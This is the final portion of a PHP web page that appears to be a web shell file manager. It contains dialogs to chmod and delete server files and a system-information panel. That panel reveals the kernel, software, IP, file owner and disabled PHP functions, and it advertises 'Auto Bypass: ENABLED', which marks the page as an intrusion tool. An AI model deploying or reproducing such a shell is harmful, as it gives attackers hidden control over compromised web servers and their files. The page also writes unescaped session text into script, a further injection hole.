                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Chmod Modal -->
    <div class="modal fade" id="chmodModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-key"></i> Change Permissions</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <form method="post">
                    <input type="hidden" name="file_name" id="chmodFileName">
                    <div class="modal-body">
                        <input type="text" class="form-control" name="new_perm" id="newPerm" required>
                        <small class="text-muted">Common permissions: 755 (rwxr-xr-x), 644 (rw-r--r--), 777 (rwxrwxrwx)</small>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                        <button type="submit" name="change_perm" class="btn btn-primary">Change</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Info Modal -->
    <div class="modal fade" id="infoModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-info-circle"></i> System Information</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <textarea class="form-control" rows="15" readonly style="background: #1a1a1a;">
Uname: <?php echo function_exists('php_uname') ? php_uname() : 'Unknown'; ?>

Software: <?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'; ?>

PHP Version: <?php echo function_exists('phpversion') ? phpversion() : 'Unknown'; ?>

Protocol: <?php echo isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'Unknown'; ?>

Server IP: <?php 
if (isset($_SERVER['SERVER_ADDR'])) {
    echo $_SERVER['SERVER_ADDR'];
} else {
    echo function_exists('gethostbyname') ? gethostbyname($server_name) : 'Unknown';
}
?>

Your IP: <?php echo $client_ip; ?>

Mail: <?php echo function_exists('mail') ? 'ON' : 'OFF'; ?>

Curl: <?php echo function_exists('curl_version') ? 'ON' : 'OFF'; ?>

Owner: <?php echo function_exists('get_current_user') ? get_current_user() : 'Unknown'; ?>

MySQL: <?php echo function_exists('mysqli_connect') ? 'ON' : 'OFF'; ?>

Disabled Functions: <?php echo $ds0; ?>

Auto Bypass: ENABLED
                    </textarea>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <script>
    // Selection functionality
    function toggleSelectAll() {
        const checkboxes = document.querySelectorAll('.item-checkbox');
        const selectAll = document.getElementById('selectAll');
        checkboxes.forEach(cb => {
            if (!cb.disabled) {
                cb.checked = selectAll.checked;
            }
        });
        toggleActionButtons();
    }

    function toggleActionButtons() {
        const checked = document.querySelectorAll('.item-checkbox:checked');
        const actionButtons = document.getElementById('actionButtons');
        const selectedCount = document.getElementById('selectedCount');
        
        selectedCount.textContent = checked.length;
        actionButtons.style.display = checked.length > 0 ? 'block' : 'none';
        
        // Update row selection
        document.querySelectorAll('.file-row').forEach(row => {
            const checkbox = row.querySelector('.item-checkbox');
            if (checkbox && !checkbox.disabled) {
                row.classList.toggle('selected', checkbox.checked);
            }
        });
    }

    function clearSelection() {
        document.querySelectorAll('.item-checkbox').forEach(cb => {
            if (!cb.disabled) cb.checked = false;
        });
        document.getElementById('selectAll').checked = false;
        toggleActionButtons();
    }

    // Modal functions
    function showRenameModal(name, type) {
        document.getElementById('oldName').value = name;
        document.getElementById('newName').value = name;
        new bootstrap.Modal(document.getElementById('renameModal')).show();
    }

    function showChmodModal(name, currentPerm) {
        document.getElementById('chmodFileName').value = name;
        document.getElementById('newPerm').value = currentPerm;
        new bootstrap.Modal(document.getElementById('chmodModal')).show();
    }

    function confirmDelete(name) {
        Swal.fire({
            title: 'Are you sure?',
            text: "You are about to delete: " + name,
            icon: 'warning',
            showCancelButton: true,
            confirmButtonColor: '#d33',
            cancelButtonColor: '#3085d6',
            confirmButtonText: 'Yes, delete it!'
        }).then((result) => {
            if (result.isConfirmed) {
                window.location.href = '?dir=<?php echo urlencode($path); ?>&action=delete&item=' + encodeURIComponent(name);
            }
        });
    }

    // Auto show file view modal if needed
    <?php if (isset($_GET['action']) && $_GET['action'] == 'view'): ?>
        document.addEventListener('DOMContentLoaded', function() {
            const modal = new bootstrap.Modal(document.getElementById('fileViewModal'));
            modal.show();
        });
    <?php endif; ?>

    // SweetAlert for messages
    <?php if (isset($_SESSION['message'])): ?>
        Swal.fire({
            title: '<?php echo isset($_SESSION['status']) ? $_SESSION['status'] : ''; ?>',
            text: '<?php echo isset($_SESSION['message']) ? $_SESSION['message'] : ''; ?>',
            icon: '<?php echo isset($_SESSION['class']) ? $_SESSION['class'] : 'info'; ?>',
            timer: 3000
        });
        <?php clear(); ?>
    <?php endif; ?>
    </script>
</body>
</html>